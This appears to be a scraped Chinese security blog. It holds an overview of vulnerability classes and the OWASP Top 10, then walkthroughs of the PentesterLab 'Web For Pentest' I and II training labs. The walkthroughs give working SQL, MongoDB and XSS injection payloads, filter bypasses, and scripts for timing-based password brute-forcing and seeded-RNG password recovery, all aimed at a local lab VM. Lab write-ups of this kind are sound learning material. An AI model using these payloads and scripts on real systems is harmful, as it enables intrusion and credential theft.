最后，漏洞来自于知识缺陷。 很突出的一个例子就是工控安全。原本的工业控制系统，大多以系统功能作为第一要素，多数系统在设计之初时封闭的“单机系统”，连联网需求都没有考虑过，就更不要提在设计、研发和集成阶段考虑网络安全问题了。物联网时代到来以后，这些工控系统都开始在互联网上“裸奔”，黑客可以轻而易举地利用系统漏洞进行攻击，造成严重后果。 并不是所有的缺陷都是漏洞，只有可以被外部利用的缺陷才被称为漏洞。这句话可以换一个角度来理解，当利用缺陷的方法出现时，漏洞导致的现实威胁就出现了。就像“心脏滴血“漏洞，引发这个漏洞的缺陷在爆发前两年的版本中就已经静悄悄地存在，当黑客利用这个缺陷获取服务器里用户的敏感信息，影响了数据的机密性，就构成了漏洞。(OpenSSL) 漏洞杀伤力参杂了很多因素，上升到政治层面会是比较恐怖的 2016-2017年，NSA 数字武器库遭到泄露，相关人士为了证明自己成功攻入 NSA 开发网络武器的“方程式组织”的系统，在网络披露了几批工具。2017年肆虐全球的 WannaCry 病毒就是从这几批泄露武器中泄露出去的。 希拉里邮件门等。 Classification基于技术类型的分类 基于漏洞成因技术的分类相比上述的两种维度要复杂得多，对于目前我所见过的漏洞大致归纳为以下几类： 内存破坏类 逻辑错误类 输入验证类 设计错误类 配置错误类 Web Vulnerabilities指的是在网站程序上的漏洞。 Classification根据严重程度，以教育行业漏洞报告平台为例 严重 直接获取重要服务器（客户端）权限的漏洞。包括但不限于远程任意命令执行、上传 webshell、可利用远程缓冲区溢出、可利用的 ActiveX 堆栈溢出、可利用浏览器 use after free 漏洞、可利用远程内核代码执行漏洞以及其它因逻辑问题导致的可利用的远程代码执行漏洞； 直接导致严重的信息泄漏漏洞。包括但不限于重要系统中能获取大量信息的SQL注入漏洞； 能直接获取目标单位核心机密的漏洞； 高危 直接获取普通系统权限的漏洞。包括但不限于远程命令执行、代码执行、上传webshell、缓冲区溢出等； 严重的逻辑设计缺陷和流程缺陷。包括但不限于任意账号密码修改、重要业务配置修改、泄露； 可直接批量盗取用户身份权限的漏洞。包括但不限于普通系统的SQL注入、用户订单遍历； 严重的权限绕过类漏洞。包括但不限于绕过认证直接访问管理后台、cookie欺骗。 运维相关的未授权访问漏洞。包括但不限于后台管理员弱口令、服务未授权访问。 中危 需要在一定条件限制下，能获取服务器权限、网站权限与核心数据库数据的操作。包括但不限于交互性代码执行、一定条件下的注入、特定系统版本下的getshell等； 任意文件操作漏洞。包括但不限于任意文件写、删除、下载，敏感文件读取等操作； 水平权限绕过。包括但不限于绕过限制修改用户资料、执行用户操作。 低危 能够获取一些数据，但不属于核心数据的操作； 在条件严苛的环境下能够获取核心数据或者控制核心业务的操作； 需要用户交互才可以触发的漏洞。包括但不限于XSS漏洞、CSRF漏洞、点击劫持； 存在以下情况我们将酌情将漏洞等级降低： 漏洞真实存在，但因为各种问题（如WAF），白帽子无法说明利用方法的 漏洞提交前，相关单位已经知晓，但暂未修复的已知漏洞 漏洞触发需要一定条件的，具有一定的偶然性 同一单位多处相似漏洞 恶意夸大漏洞危害的 如下漏洞将被忽略： 非（不确定）教育相关行业单位 不在奖励范围内的高校 虚假漏洞 本平台上已有其他白帽子提交过的漏洞 互联网上已经被公开的漏洞 提交到本平台后又提交到其他平台的漏洞 没有链接、截图、利用方法等漏洞详情不详细的漏洞 需要登录管理员后台才能触发的漏洞 需要中间人攻击的漏洞 Self-XSS 无敏感操作的CSRF漏洞 钓鱼漏洞 无敏感信息的 JSON Hijacking 扫描器取得结果，但白帽子无法提供利用方法的漏洞 无意义的源码泄露、内网IP、域名泄露 拒绝服务漏洞 技术漏洞与非技术漏洞，即技术漏洞与业务漏洞 OWASP Top 10OWASP – Open Web Application Security Project，即开放式Web应用程序安全项目是一个在线社区，在Web应用程序安全性领域提供免费的文章，方法，文档，工具和技术 Top 1 Injection Flaws 注入将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。 一些常见的注入，包括：SQL、OS命令、ORM、LDAP和表达式语言（EL）或OGNL注入。所有解释器的概念都是相同的。代码评审是最有效的检测应用程序的注入风险的办法之一，紧随其后的是对所有参数、字段、头、cookie、JSON和XML数据输入的彻底的 DAST 扫描，即 Dynamic Application Security Testing。 Top 2 Broken Authentication and Session Management 失效的身份认证通常，通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。 Top 3 Sensitive Data Exposure 敏感数据泄露许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。 Top 4 XML External Entity XML 外部实体许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。 Top 5 Broken Access Control 失效的访问控制未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。 Top 6 Security Misconfiguration 安全配置错误安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。 Top 7 Cross-Site Scripting 跨站脚本当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建HTML或JavaScript的浏览器API更新现有的网页时，就会出现XSS缺陷。XSS让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。 Top 8 Insecure deserialization 不安全的反序列化不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。 Top 9 Using Components With Known Vulnerabilities 使用含有已知漏洞的组件组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。 Top 10 Insufficient Logging and Monitoring 不足的日志记录和监控不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。","link":"/2019/04/08/Vulnerabilites-For-A2OS/"},{"title":"Web For Pentest II","text":"接Web For Pentest，这里是它的第二版 [TOC] Pre准备如第一版的第一部分，找到靶机 ip 即可。 HackingSQL injectionsExample 1比较简单的用万能密码就可以过了username=1%27+or+1%3D1%23&amp;password=1 Example 2一个单引号发现报错 1Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'' at line 1: SELECT * FROM users WHERE username='1'' AND password='1' 一顿 fuzz 发现注释被过滤，但是 password 后面仍可以用#，而且这里可能有点坑的地方是貌似并不是用admin的用户，所以需要在最后用or 1=1#进行绕过，用limit 1限制一条输出 1username=' or '1'='1&amp;password=1' or 1=1 limit 1%23&amp;submit=提交查询 Example 3这里过滤了单引号，我们可以从代码看看 1234params['username'].gsub!(\"'\",\"\")params['password'].gsub!(\"'\",\"\")sql = \"SELECT * FROM users WHERE username='\"+ params['username']+\"'\"sql+= \" AND password='\"+ params['password'] +\"'\" 这里过滤了单引号，但是没有过滤掉注入，我们可以利用注释符注释掉最后一个引号，用\\转义中间的'，这样就形成了一个单引号闭合，再利用or 1=1进行绕过，用limit 1取一条，最终的 payload 1username=admin\\&amp;password=or 1=1 limit 1%23&amp;submit=提交查询 Example 41http://172.16.71.149/sqlinjection/example4/?req=username%3d%27hacker%27 猜测拼接的是最后的where语句，用id=1返回了 id 为 1 的账户，尝试id=1 union select 1,2,3%23，成功多返回了一行1,2 123union SELECT 1,schema_name,3 from information_schema.schemata information_schema,authentication_example3,authentication_example4,authentication_example5,authentication_example6,authorization_example1,authorization_example2,authorization_example3,massassign_example1,massassign_example2,massassign_example3,randomness_example1,randomness_example2,randomness_example3,randomness_example4,sqlinjection_exam 然而接下来读不到sqlinjection_exam，可能因为权限不够。但是还有一种可能就是…没读完，有输出限制，表名可能是sqlinjection_example啥的，所以我们用limit 1限制一下 1id%3d1 union SELECT 1,schema_name,3 from information_schema.schemata limit 15,20%23 123456789union SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema='sqlinjection_example4';usersunion SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name='users';id,username,passwordunion SELECT id,username,password from users; 也可以用报错 1234OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)Mysql2::Error: Duplicate entry 'p0~pentesterlab@localhost~p01' for key 'group_key': SELECT * FROM users WHERE id=0 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a);id 记得把虚拟机配置内存提到 1G ，否则会报下面的错： 1Mysql2::Error: Got error 28 from storage engine: Example 51http://172.16.71.149/sqlinjection/example5/?limit=3 看参数提示就是一个limit注入 1limit 3 procedure analyse(extractvalue(rand(),concat(0x3a,(select version()))),1);%23 偷个懒，就不注其他的数据库，直接上sqlinjection_example5 12345limit 3 procedure analyse(extractvalue(rand(),concat(0x3a,(SELECT group_concat(table_name) from information_schema.tables where table_schema='sqlinjection_example4'))),1);%23Mysql2::Error: XPATH syntax error: ':users': SELECT * FROM users LIMIT 3 procedure analyse(extractvalue(rand(),concat(0x3a,(SELECT group_concat(table_name) from information_schema.tables where table_schema='sqlinjection_example4'))),1); limit 3 procedure analyse(extractvalue(rand(),concat(0x3a,(SELECT group_concat(id) from users ))),1);%23 Example 61http://172.16.71.149/sqlinjection/example6/?group=username 看参数提示应该是个group by注入，我们可以用报错注入 1GROUP BY username and (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) Example 71http://172.16.71.149/sqlinjection/example7/?id=1 通过单引号返回 sql 错误 1Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1: SELECT * FROM users WHERE id=1' 一个简单的整形注入，用1 or 1=1%23返回 1Should only return one user... 加个limit就好了 10 union select 1,group_concat(schema_name),3 from information_schema.schemata limit 2,1%23 然后这样构造，我觉得应该没什么错，但是返回的是 1Should only return one user... 讲道理应该只返回一条数据了，看了源代码 12345678sql = \"SELECT * FROM users WHERE id=#{params[:id]}\"@r = ActiveRecord::Base.connection.execute(sql).to_aif @r.size == 1 name = @r.first[1] sql = \"SELECT * FROM users WHERE username='#{name}'\" @res = ActiveRecord::Base.connection.execute(sql).to_aelse raise Exception, \"Should only return one user...\" 这里应该没什么办法通过 union 进行注入了，由于自己当时陷进去了，一直在想怎么绕 union ，看了文档才发现自己思路太单一了，这里其实有报错回显那就可以用报错注入 12345670 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)%23Mysql2::Error: Duplicate entry 'p0~pentesterlab@localhost~p01' for key 'group_key': SELECT * FROM users WHERE id=0 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)# 0 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT table_name from information_schema.tables where table_schema='sqlinjection_example7'),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)%23Mysql2::Error: Duplicate entry 'p0~users~p01' for key 'group_key': SELECT * FROM users WHERE id=0 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT table_name from information_schema.tables where table_schema='sqlinjection_example7'),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)# Example 81http://172.16.71.149/sqlinjection/example8/ 比较明显的 insert 注入，我们可以直接用形如以下的 payload 来注入 1insert into message(id,user_id,message_id) values (4,'zedd' or updatexml(1,concat(0x7e,(select @@version),0x7e),0) or '', 'hi'); 虽然页面不会直接回显，但是点击 id 的超链接过去就可以看到了 Example 91http://172.16.71.149/sqlinjection/example9/?username=1%27%20or%201=1%23&amp;password=1&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 无回显注入 121'%a0%26%26%a0if(1%2Csleep(2)%2C0)%a0%26%26%a0'1'%3D'11\"%a0%26%26%a0if(1%2Csleep(2)%2C0)%a0%26%26%a0\"1\"%3D\"1 随便 fuzz 的时候发现回显 1invalid byte sequence in UTF-8 猜测是宽字节注入，用%df尝试注入，注入成功 11%df%27%20or%201=1%23&amp;password=1 AuthorizationExample 1 ​ In this exercise, you can log in with the following user: user1 with the password “pentesterlab”. Once you logged in and have a play around, log out and try to access the same information. 题目意思就是做失效的身份认证，第一个比较简单，登录后发现的两个地址都可以在 logout 之后又打开 Example 2 ​ In this exercise, you can log in with the following user: user1 with the password “pentesterlab”. Once you logged in and have a play around, try to access the information from user2. 这里是个水平越权，也是比较简单，直接抓包顺序查看下一个 infos 就发现了 user2 的了 12345678910GET /authorization/example2/infos/3 HTTP/1.1Host: 172.16.71.149User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://172.16.71.149/authorization/example2/Connection: closeCookie: rack.session=8c8b4862b1564eb97e9c4873e34c60d89409086ae1ecb229303e6715f3e1b69dUpgrade-Insecure-Requests: 1 Example 3 ​ In this exercise, you can log in with the following user: user1 with the password “pentesterlab”. Once you logged in and have a play around, try to access the information from user2. 进入页面发现比之前多了一个修改的功能，这里以为是可以修改其他人的然后返回修改结果…谁知道修改自己的都有点小 bug … 后来发现，是可以通过编辑功能在 placeholder处看到其他人的信息 MongoDB injectionExample 1使用万能密码登录 1username=1' || 1==1//&amp;password=1 注意 MongoDB 的语法不太一样，相等要用==，可以用//或者&lt;!--做注释 Example 2通过search=admin' or 1==1//回显 1$where compile error 最后看了文档，才发现这里还要猜一个 password的字段，感觉如果没有提示的话也比较难，先看一下源代码 1234567if params['search'] begin nosql = \"this.username=='#{params['username']}'\" @res = User.all('$where' =&gt; nosql) rescue Exception =&gt; e @message = e.to_s end 这里需要加一个admin' &amp;&amp; this.password.match(/.*/)//，这样就可以拼凑成 1this.username == 'admin' &amp;&amp; this.password.match(/.*/)// 这样就可以匹配admin的密码了，所以只要我们写好正则就行了，用^从开头匹配，根绝页面返回来注出密码了 脚本如下： 12345678910111213141516import requestsimport reimport stringimport base64index_url = 'http://172.16.71.149/mongodb/example2/?search='passwd = ''while True: for i in string.ascii_letters + string.digits: payload = \"admin' %26%26 this.password.match(/^\"+ passwd + i + \"/)//\" rep = requests.get(index_url+payload) # print(rep.text) if 'admin' in rep.text: passwd += i print(\"[-] find a char:{}\".format(passwd)) break AuthenticationExample 1弱口令admin/admin Example 2这里以为是社工什么，结果看文档是通过利用密码对比的时间的不同来进行爆破得到密码的。 1234567891011GET /authentication/example2/ HTTP/1.1Host: 172.16.71.149User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://172.16.71.149/Connection: closeCookie: rack.session=0dbcdabae0f95432d8fa96ebf7103952ba2f82590bc454db88cb00b400b1d3fbUpgrade-Insecure-Requests: 1Authorization: Basic aGFja2VyOmhhY2tlcg== 通过我们抓包发现存在Authorization: Basic aGFja2VyOmhhY2tlcg==字段，可以知道这里是通过把账号密码进行 base64 编码来进行认证的，比如这里就是hacker:hacker， 1234567891011121314151617181920212223242526272829b'hacker:o'1.404764b'hacker:p'1.606023b'hacker:p3'1.60843b'hacker:p4'1.80702b'hacker:p4r'1.80603b'hacker:p4s'2.006654b'hacker:p4sr'2.007834b'hacker:p4ss'2.207312b'hacker:p4ssv'2.209067b'hacker:p4ssw'2.407329b'hacker:p4sswZ'2.412927b'hacker:p4ssw0'2.610178 这里基本就能猜出来了，密码是p4ssw0rd，自己写的渣渣脚本 1234567891011121314151617181920212223import requestsimport reimport stringimport base64index_url = 'http://172.16.71.149/authentication/example2/'req = requests.session()time_ex = '2.4'for i in string.ascii_letters + string.digits: payload = ('hacker:p4ssw' + i).encode(\"utf-8\") print(payload) payload = base64.b64encode(payload).decode(\"utf-8\") headers = { 'Authorization' : 'Basic ' + payload } rep = req.get(index_url,headers=headers) time = rep.elapsed.total_seconds() if float(time) - float(time_ex) &gt; 0.1 : print(time_ex) print(time) exit() time_ex = time Example 3抓包发现可以发现在Cookie看到有user字段，改成admin就可以了 123456789GET /authentication/example3/ HTTP/1.1Host: 172.16.71.149User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: user=adminUpgrade-Insecure-Requests: 1 Example 4抓包发现只是在 Cookie 中用了 md5 而已，换成admin的 md5 就好了 21232f297a57a5a743894a0e4a801fc3 1234567891011GET /authentication/example4/ HTTP/1.1Host: 172.16.71.149User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://172.16.71.149/authentication/example4/?username=user1&amp;password=admin&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2Connection: closeCookie: user=24c9e15e52afc47c225b757e7bee1f9d;Upgrade-Insecure-Requests: 1Cache-Control: max-age=0 Example 5多了一个注册功能，以为是 sql 约束攻击，但是其实是 mysql 数据库默认不区分大小写的问题 注册一个Admin用户登录即可 Example 6这里利用了 sql 会自动去掉多余空格的特性，也属于 sql 约束攻击的原理部分，我们注册一个admin后面带有几个空格的就可以了 Mass AssignmentExample 1比较正常的思路，提交加入user[admin]=1参数即可 Example 21update_profile?user[username]=admin&amp;user[password]=admin&amp;user[admin]=1&amp;submit=提交查询 新增了一个 Modify your profile 的功能，那就是在这个 api 上user[admin]=1就行了 Example 3 ​ In this exercise, you can log in with the following user: user1 with the password “pentesterlab”. Once you logged in, try to access the information fromt the company “Company 2”. 跟之前差不多，只不过这次 edit 加上user[company_id]=2即可 Captcha感觉这个系列压根没想让你揉眼看出验证码… Example 1删掉captcha请求参数即可 12345678910GET /captcha/example1/submit?submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 HTTP/1.1Host: 172.16.71.149User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://172.16.71.149/captcha/example1/Connection: closeCookie: rack.session=525baf022ef804ebce727262500c3074f121064d31acccf75fc07532bf37e54dUpgrade-Insecure-Requests: 1 Example 2在请求头看到答案 12345678910GET /captcha/example2/submit?captcha=1&amp;answer=EDtRmsPHWz&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 HTTP/1.1Host: 172.16.71.149User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://172.16.71.149/captcha/example2/Connection: closeCookie: rack.session=525baf022ef804ebce727262500c3074f121064d31acccf75fc07532bf37e54dUpgrade-Insecure-Requests: 1 Example 3在 cookie 中可以看到 12345678910GET /captcha/example3/submit?captcha=1&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 HTTP/1.1Host: 172.16.71.149User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://172.16.71.149/captcha/example3/Connection: closeCookie: captcha=C%5DjhO%5DEL%5B%5B; rack.session=525baf022ef804ebce727262500c3074f121064d31acccf75fc07532bf37e54dUpgrade-Insecure-Requests: 1 Example 4这里比较简单就可以看出验证码了，看出来直接输入就行了。但是官方给的是因为 session 不变，验证码就不变，可以爆破…感觉没那个必要 Example 5这里就是几个验证码，而且都是形成了单词，比如 hacker/securtiy 等，官方给的是弄一个字典爆破 Example 6 这里是可以直接识别得出来的，字体并没有经过任何变换。 Example 7 这里只是加了蓝色的条纹，官方给出了去除条纹的脚本 1234require 'RMagick'image = Magick::Image.read(\"current7.png\").firstimage = image.threshold(THRESHOLD)image.write(\"current7.png\") Example 8 这里是 7 的进化，进行了一点扭曲 12345require 'RMagick'image = Magick::Image.read(\"current8.png\").firstimage = image.implode(IMPLODE)image = image.threshold(THRESHOLD)image.write(\"current8.png\") Example 9 简单计算，python 正则取出来直接eval即可 Randomness IssuesExample 1 ​ In this exercise, you can log in with the following user: “hacker“ with the password “hjtvse“. Your user is the second one that has been created for this application and you retrieved the following source code: 12345s = Random.new(0)pass = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.joinUser.create(:username =&gt; 'admin', :password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED))pass = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.joinUser.create(:username =&gt; 'hacker', :password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED)) 用 ruby 本地跑一下可以发现貌似产生的随机是固定的 12345s = Random.new(0)pass = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.joinputs pass#mpvadd 密码就是mpvadd Example 2 In this exercise, you can log in with the following user: “hacker“ with the password “afxabo“. Your user is the second one that has been created for this application and you retrieved the following source code: 12345s = Random.new(Time.now.to_i)pass = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.joinUser.create(:username =&gt; 'admin', :password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED))pass = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.joinUser.create(:username =&gt; 'hacker', :password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED)) 虽然这次用的是时间数种子，但是我们仍然可以爆破出来，贴一个其他师傅的脚本 12345678910111213141516timestamp = (Time.now.to_f).to_iseed = Random.new(timestamp)pass_admin = 6.times.map { ('a'..'z').to_a[seed.rand(('a'..'z').to_a.size)]}.joinpass_hacker = 6.times.map { ('a'..'z').to_a[seed.rand(('a'..'z').to_a.size)]}.joinwhile pass_hacker !=\"afxabo\" do timestamp = timestamp - 1 seed = Random.new(timestamp) pass_admin = 6.times.map { ('a'..'z').to_a[seed.rand(('a'..'z').to_a.size)]}.join pass_hacker = 6.times.map { ('a'..'z').to_a[seed.rand(('a'..'z').to_a.size)]}.joinendputs \"Password of admin: \"puts pass_admin#vqcpux 得到 admin 密码 Example 3 In this exercise, you can log in with the following user: “hacker“ with the password “xgyymbghxo“.Your user is the second one that has been created for this application and you retrieved the following source code: 12345s = Random.new(0)pass = (6+s.rand(5)).times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.joinUser.create(:username =&gt; 'admin', :password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED))pass = (6+s.rand(5)).times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.joinUser.create(:username =&gt; 'hacker', :password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED)) 由于还是用 0 做的种子，所以我们仍然可以重放登录密码 12345s = Random.new(0)pass = (6+s.rand(5)).times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.joinputs pass#pvaddhjtvs Example 4 In this exercise, you can log in with the following user: “hacker“ with the password “wtpwnl“. Your user is the second one that has been created for this application and you retrieved the following source code: 123456s = Random.new(0)rand(1000).times {s.rand(5)}pass = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.joinUser.create(:username =&gt; 'admin', :password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED))pass = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.joinUser.create(:username =&gt; 'hacker', :password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED)) 虽然用rand(1000)来用随机种子，但是依然可以爆破，给一个其他师傅的脚本： 1234567891011121314151617n = 1000seed = Random.new(0)n.times {seed.rand(5)}pass_admin = 6.times.map { ('a'..'z').to_a[seed.rand(('a'..'z').to_a.size)]}.joinpass_hacker = 6.times.map { ('a'..'z').to_a[seed.rand(('a'..'z').to_a.size)]}.joinwhile pass_hacker !=\"wtpwnl\" do n = n - 1 seed = Random.new(0) n.times {seed.rand(5)} pass_admin = 6.times.map { ('a'..'z').to_a[seed.rand(('a'..'z').to_a.size)]}.join pass_hacker = 6.times.map { ('a'..'z').to_a[seed.rand(('a'..'z').to_a.size)]}.joinendputs \"Password de admin: \"puts pass_admin Conclusion整体虽然偏简单，但是做完收获还是比较大的，也补充了一点知识，对于 ruby 这里的学习由于最近时间比较紧，就直接用的是其他师傅的脚本了，对于 sql 盲注还是需要补充一些知识的，还有一些原理需要更深入一些。还有一些认证绕过，对于挖洞还是比较有启发性的。","link":"/2019/03/10/Web-For-Pentest-II/"},{"title":"Web For Pentest","text":"很久之前就想做的靶机，一直没做，最近有空清理一下。地址在PentestLab [TOC] Pre下载得到一个 iso 后直接用 vmware 装起来，ifconfig得到 ip ，访问就可以看到主页了 HackingXSSExample 11http://172.16.71.152/xss/example1.php?name=hacker 一个典型的反射型 xss ，我们可以看到 url 中有个name的参数，直接 x 1http://172.16.71.152/xss/example1.php?name=%3Cscript%3Ealert(1);%3C/script%3E Example 21http://172.16.71.152/xss/example1.php?name=hacker 还是尝试用&lt;script&gt;alert(1);&lt;/script&gt;直接 x ，发现被过滤了 12345678910&lt;div class=\"container\"&gt;Hello alert(1) &lt;footer&gt; &lt;p&gt;&amp;copy; PentesterLab 2013&lt;/p&gt; &lt;/footer&gt; &lt;/div&gt; &lt;!-- /container --&gt; 大小写绕过 1http://172.16.71.152/xss/example2.php?name=%3CScript%3Ealert(1)%3C/Script%3E Example 31http://172.16.71.152/xss/example3.php?name=hacker 大小写也被过滤了，双写的话竟然没有被替代&lt;scscriptript&gt;，直接原样返回了，换成其他标签 1http://172.16.71.152/xss/example3.php?name=%3Cbody/onload=alert(1)%3E 查看了源代码，原来是把&lt;script&gt;与&lt;/script&gt;都替换了，把尖括号也替代了…也是自己不够仔细…确实应该想到替换包含了尖括号的问题 1http://172.16.71.152/xss/example3.php?name=%3CSc%3CScript%3Eript%3Ealert(1)%3C/Sc%3C/Script%3Eript%3E Example 41http://172.16.71.152/xss/example4.php?name=hacker 使用&lt;script&gt;alert(1)&lt;/script&gt;，发现直接回显了error，并没有其他的提示了，我们仍旧可以使用&lt;body/onload=alert(1)&gt; 源代码是 123if(preg_match('/script/i',$_GET['name'])){ die('error');} 禁止使用了script关键字 Example 51http://172.16.71.152/xss/example5.php?name=hacker fuzz 发现是alert直接就返回error了，不用alert，我们还有prompt 1http://172.16.71.152/xss/example5.php?name=%3Cbody/onload=prompt(1)%3E 源代码是： 123if(preg_match('/alert/i',$_GET['name'])){ die('error');} 这…感觉有点无语，讲道理我还以为应该是script与alert一起过滤了… Example 61http://172.16.71.152/xss/example6.php?name=hacker 用&lt;script&gt;alert(1)&lt;/script&gt;测试，发现输入变成了 1234Hello &lt;script&gt; var $a= \"&lt;script&gt;alert(1)&lt;/script&gt;\";&lt;/script&gt; 意思就是把输入给放在了var $a= \"…\"当中，闭合双引号，注释后面即可 